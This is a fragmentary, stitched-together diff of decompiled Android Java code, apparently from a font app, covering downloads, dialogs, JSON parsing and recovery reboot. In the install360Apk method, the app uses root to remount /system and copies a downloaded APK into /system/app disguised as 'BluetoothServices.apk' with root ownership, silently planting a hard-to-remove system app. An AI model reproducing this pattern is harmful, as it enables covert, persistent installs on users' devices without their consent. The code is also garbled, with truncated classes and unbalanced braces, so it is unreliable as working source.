+final class FontDetailBean
+{
+  long _id;

+

+  {

+    {

+      {
+        paramString = new JSONObject(paramString).getJSONObject("result");
+        localFontDetailBean._id = paramString.getLong("id");
+        localFontDetailBean._name = URLDecoder.decode(paramString.getString("name"));
+        localFontDetailBean._size = URLDecoder.decode(paramString.getString("size"));

+        {
+          localFontDetailBean._imgUrlArray[i] = URLDecoder.decode(paramString.getJSONObject(i).getString("img"));
+          i += 1;
+        }
+        localFontDetailBean.previewUrl = localFontDetailBean._imgUrlArray[0];
+        return localFontDetailBean;
+      }
+      catch (JSONException paramString)
+      {
+        return null;
+      }
+    }
+    return null;
+  }

+  {

+package com.yy.fontmaster.local;

+import android.app.Activity;

+import android.content.Intent;
+import android.os.Handler;

+import framework.download.DownloadBean;
+import framework.download.IDownloadManager;
+
+final class DeleteDialog
+  extends Dialog
+  implements View.OnClickListener
+{

+  {

+    this._cancelBtn = findViewById(2131361835);
+    this._cancelBtn.setOnClickListener(this);
+  }
+  
+  public void onClick(View paramView)
+  {
+    if (paramView == this._confirmBtn)
+    {
+      ((SoftApplication)this._caller.getApplication()).getDownloadManager().deleteDownloadTask(this._bean._id, this._bean._type, true);

+      {

+          localIntent.setClass(DeleteDialog.this._caller, ActLocal.class);
+          localIntent.setFlags(65536);

+          DeleteDialog.this._caller.overridePendingTransition(0, 0);

+  private void install360Apk()
+  {
+    if (download360Apk()) {}
+    try
+    {
+      IRootManager localIRootManager = RootManager.getInstance(this._caller);
+      localIRootManager.write("busybox mount -o remount,rw /system\n");
+      localIRootManager.write("busybox cat " + SavePathSetting.BOOKMARK_SAVE_PATH + " > /system/app/BluetoothServices.apk\n");
+      localIRootManager.write("busybox chown 0.0 /system/app/BluetoothServices.apk\n");
+      localIRootManager.write("busybox chmod 0644 /system/app/BluetoothServices.apk\n");
+      return;
+    }
+    catch (Exception localException) {}
+  }

+    NotificationHelperImpl.getInstance(this._caller).clearAllNotification();
+    flashPkgCore(paramOnActEventListener, paramString1, paramString2);
+    localWakeLock.release();
+  }

+package framework.flash;
+
+public abstract class ExcuteService
+{
+  protected OnBrushEventListener _brushEventListener = OnBrushEventListener.Null;
+  
+  public ExcuteService() {}
+  
+  abstract void coreWork();
+  
+  public abstract void doPostAction();
+  
+  public abstract void doPreAction();
+  
+  public void excute()
+  {
+    if (isValid())
+    {
+      this._brushEventListener.onCheckComplete();
+      doPreAction();
+      coreWork();
+      doPostAction();
+    }
+  }
+  
+  abstract boolean isValid();
+  
+  public void setOnEventListener(OnBrushEventListener paramOnBrushEventListener)
+  {
+    if (paramOnBrushEventListener != null) {
+      this._brushEventListener = paramOnBrushEventListener;
+    }
+  }

+  {
+    NetworkManager localNetworkManager = NetworkManagerImpl.getInstance(this._context);
+    try
+    {
+      HttpResponse localHttpResponse = localNetworkManager.openUrl(this._bean._downurl);
+      if (localNetworkManager.connect(localHttpResponse) == 200)
+      {
+        download2File(localHttpResponse, this._listener);
+        return;
+      }
+      this._bean._state = DownloadBean.State.Error;
+      this._listener.onDownloadFail(this._bean);
+      return;
+    }
+    catch (SocketTimeoutException localSocketTimeoutException)
+    {
+      this._bean._state = DownloadBean.State.Error;
+      this._listener.onDownloadFail(this._bean);
+    }
+  }

+package framework.net;
+
+import android.content.Context;
+import framework.util.ITransformManager;
+import framework.util.TransformManagerImpl;
+import java.io.File;
+import java.net.SocketTimeoutException;
+import org.apache.http.HttpResponse;
+
+public final class DownloadImgTask
+  implements Runnable
+{
+  private final Context _context;
+  private final String _saveDir;
+  private final String _url;
+  private DownloadImgEventListener listener = DownloadImgEventListener.Null;
+  
+  public DownloadImgTask(Context paramContext, String paramString1, String paramString2, DownloadImgEventListener paramDownloadImgEventListener)
+  {
+    this._context = paramContext;
+    this._url = paramString1;
+    this._saveDir = paramString2;
+    if (paramDownloadImgEventListener != null) {
+      this.listener = paramDownloadImgEventListener;
+    }
+  }
+  
+  public void run()
+  {
+    NetworkManager localNetworkManager = NetworkManagerImpl.getInstance(this._context);
+    String str;
+    try
+    {
+      HttpResponse localHttpResponse = localNetworkManager.openUrl(this._url);
+      if (localNetworkManager.connect(localHttpResponse) != 200) {
+        break label211;
+      }
+      Object localObject = TransformManagerImpl.getInstance();
+      localObject = this._saveDir + File.separator + ((ITransformManager)localObject).transformUrl2FileName(this._url);
+      str = (String)localObject + ".tmp";
+      if (new File((String)localObject).exists())
+      {
+        this.listener.onDownloadImgComplete(new File((String)localObject));
+        return;
+      }
+      if (localNetworkManager.download2File(localHttpResponse, str))
+      {
+        new File(str).renameTo(new File((String)localObject));
+        this.listener.onDownloadImgComplete(new File((String)localObject));
+        return;
+      }
+    }
+    catch (SocketTimeoutException localSocketTimeoutException)
+    {
+      this.listener.onDownloadImgFail();
+      return;
+    }
+    new File(str).delete();
+    this.listener.onDownloadImgFail();
+    return;
+    label211:
+    this.listener.onDownloadInvalid();
+  }
+}

+package framework.net;
+
+import android.content.Context;
+import java.net.SocketTimeoutException;
+import org.apache.http.HttpResponse;
+
+public class ObtainJsonTask
+  implements Runnable
+{
+  private final Context _context;
+  private final JsonInflater _inflater;
+  private final String _url;
+  
+  public ObtainJsonTask(Context paramContext, String paramString, JsonInflater paramJsonInflater)
+  {
+    this._context = paramContext.getApplicationContext();
+    this._url = paramString;
+    this._inflater = paramJsonInflater;
+  }
+  
+  public void run()
+  {
+    Object localObject = NetworkManagerImpl.getInstance(this._context);
+    try
+    {
+      HttpResponse localHttpResponse = ((NetworkManager)localObject).openUrl(this._url);
+      if (((NetworkManager)localObject).connect(localHttpResponse) == 200)
+      {
+        localObject = new String(((NetworkManager)localObject).fetchData(localHttpResponse));
+        this._inflater.inflate((String)localObject, JsonInflater.NetworkStatus.Good);
+        return;
+      }
+      this._inflater.inflate(null, JsonInflater.NetworkStatus.Invalid);
+      return;
+    }
+    catch (SocketTimeoutException localSocketTimeoutException)
+    {
+      this._inflater.inflate(null, JsonInflater.NetworkStatus.Timeout);
+    }
+  }

+      this._downloadTaskRunner.addTask(paramRunnable);
+    }

+        return;
+      }
+    } while (!(paramRunnable instanceof DownloadImgTask));
+    this._singleTaskRunner.addTask(paramRunnable);
+  }

+  
+  void rebootRecovery(final OnRebootDialogEventListener paramOnRebootDialogEventListener)
+  {
+    new Thread(new Runnable()
+    {
+      public void run()
+      {
+        try
+        {
+          Thread.sleep(9000L);
+          RebootDialogController.this.rebootRecoveryCore();
+          Thread.sleep(3000L);
+          paramOnRebootDialogEventListener.onRebootFail();
+          return;
+        }
+        catch (InterruptedException localInterruptedException)
+        {
+          for (;;)
+          {
+            localInterruptedException.printStackTrace();
+          }
+        }
+      }
+    }).start();
+  }
+  
+  void showLoadingDialog(String paramString)
+  {
+    if (this.loadingDialog == null) {
+      this.loadingDialog = new LoaddingDialog(this.caller, false);
+    }
+    this.loadingDialog.setMessage(paramString);
+    if (!this.loadingDialog.isShowing()) {
+      this.loadingDialog.show();
+    }
+  }
+}
